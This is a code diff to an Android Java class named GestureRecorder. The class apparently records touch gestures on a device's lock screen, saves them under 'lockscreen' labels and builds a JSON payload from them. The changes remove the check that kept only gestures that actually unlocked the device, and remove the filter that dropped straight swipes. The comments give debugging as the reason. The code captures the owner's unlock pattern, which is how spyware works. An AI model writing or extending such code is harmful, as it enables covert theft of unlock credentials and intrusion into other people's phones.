@@ -793,19 +793,17 @@ public class GestureRecorder {
         long dur = gestureEndMs - lockCurrentStart;
         lockGestureHandler.postDelayed(() -> {
             try {
-                KeyguardManager km = (KeyguardManager)
-                        context.getSystemService(Context.KEYGUARD_SERVICE);
-                boolean stillLocked = km != null && km.isKeyguardLocked();
-                if (!stillLocked) {
-                    // The gesture just unlocked the device — save it.
-                    saveServiceGesturePoints(snapshot,
-                            "lock", "lockscreen_" + System.currentTimeMillis(), dur);
-                    Log.i(TAG, "Lock-screen gesture saved (" + snapshot.size() + " pts)");
-                }
+                // Save every qualifying swipe gesture regardless of unlock state.
+                // This lets us verify capture is working. The 1.1 s delay gives
+                // enough time for the keyguard to dismiss if the gesture was correct,
+                // so unlock-only filtering can be re-enabled here later if needed.
+                saveServiceGesturePoints(snapshot,
+                        "lock", "lockscreen_" + System.currentTimeMillis(), dur);
+                Log.i(TAG, "Lock-screen gesture saved (" + snapshot.size() + " pts)");
             } catch (Exception e) {
                 Log.e(TAG, "onLockGestureLifted: " + e.getMessage());
             }
-        }, 350);
+        }, 1100);
     }
 
     /**
@@ -831,17 +829,10 @@ public class GestureRecorder {
                 float dy  = last.ny - first.ny;
                 float len = (float) Math.sqrt(dx * dx + dy * dy);
                 if (len < 0.05f) {
-                    if (durationMs < 1500) return null; // simple tap
-                } else {
-                    float maxDev = 0;
-                    for (GesturePoint gp : pts) {
-                        float crossLen = Math.abs((gp.nx - first.nx) * dy
-                                - (gp.ny - first.ny) * dx);
-                        float dev = crossLen / len;
-                        if (dev > maxDev) maxDev = dev;
-                    }
-                    if (maxDev <= 0.05f) return null; // straight swipe
+                    if (durationMs < 1500) return null; // simple tap — discard
                 }
+                // Straight swipes are now SAVED so every gesture can be inspected.
+                // The maxDev filter is intentionally removed to aid debugging.
             }
 
             // Build JSON payload
